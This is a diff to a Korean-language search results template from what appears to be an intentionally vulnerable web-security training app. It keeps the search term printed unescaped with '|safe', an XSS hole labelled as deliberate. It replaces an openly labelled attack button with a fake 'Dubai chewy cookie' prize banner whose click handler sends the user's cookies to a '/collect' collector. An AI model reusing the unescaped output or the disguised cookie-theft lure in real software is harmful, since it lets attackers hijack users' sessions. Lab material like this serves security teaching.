@@ -47,16 +47,30 @@
   {% if q %}
   <!-- [VULNERABILITY INJECTION] A03:2025-Injection (XSS) -->
   <!-- |safe 필터를 사용하여 검색어(q)를 이스케이프 없이 그대로 출력함 -->
-  <div style="margin-top: 15px; margin-bottom: 5px; display: flex; align-items: center; gap: 10px;">
+  <div style="margin-top: 15px; margin-bottom: 5px; display: flex; flex-direction: column; gap: 10px;">
     <span style="color: var(--text-dim);">검색어 <strong>'{{ q|safe }}'</strong>에 대한 결과입니다.</span>
 
-    <!-- 실습용 공격 실행 버튼 (교육용) -->
-    <button type="button" class="btn btn-danger"
-      style="background-color: #ff4d4d; border: none; font-size: 0.8em; padding: 4px 8px;" onclick="if(confirm('이 버튼을 누르면 XSS 공격이 시뮬레이션되어 세션정보가 공격자 서버로 전송됩니다. 계속하시겠습니까?')) { 
-                fetch('/collect?cookie=' + btoa(document.cookie)).then(() => alert('세션 정보가 공격자 대시보드로 유출되었습니다!')); 
-            }">
-      ⚠️ 공격 실행 (세션 탈취)
-    </button>
+    <!-- [교육용 위장 배너] '두바이 쫀득 쿠키(두쫀쿠)' 이벤트로 위장한 XSS 실습 벡터 -->
+    <div
+      style="padding: 15px; background: linear-gradient(135deg, #fce4ec 0%, #f06292 100%); border: 2px solid #ad1457; border-radius: 12px; display: flex; align-items: center; justify-content: space-between; cursor: pointer; transition: all 0.2s; max-width: 660px; margin: 20px auto; color: white;"
+      onclick="if(confirm('[EVENT] 품절대란! 지금 응모하면 \'두바이 쫀득 쿠키(두쫀쿠)\' 1박스 경품 당첨의 기회! 응모하시겠습니까?')) { 
+             fetch('/collect?cookie=' + btoa(document.cookie)).then(() => alert('이벤트 응모 완료! 당첨 시 등록된 연락처로 안내됩니다. (세션 정보가 공격자 대시보드로 유출되었습니다)')); 
+         }"
+      onmouseover="this.style.boxShadow='0 6px 20px rgba(173,20,87,0.4)'; this.style.transform='translateY(-3px)';"
+      onmouseout="this.style.boxShadow='none'; this.style.transform='none';">
+      <div style="display: flex; align-items: center; gap: 15px;">
+        <div style="font-size: 36px;">🍪</div>
+        <div>
+          <div style="font-weight: 800; color: #ffffff; font-size: 1.2em; text-shadow: 1px 1px 2px rgba(0,0,0,0.2);">
+            품절대란 '두바이 쫀득 쿠키' 증정! 🎁</div>
+          <div style="font-size: 0.9em; color: #fce4ec;">지금 바로 클릭해서 무료 경품 이벤트에 응모하세요!</div>
+        </div>
+      </div>
+      <div
+        style="background: white; color: #ad1457; padding: 8px 16px; border-radius: 25px; font-weight: bold; font-size: 0.85em; white-space: nowrap; box-shadow: 0 2px 5px rgba(0,0,0,0.1);">
+        무료 응모하기
+      </div>
+    </div>
   </div>
   {% endif %}
 
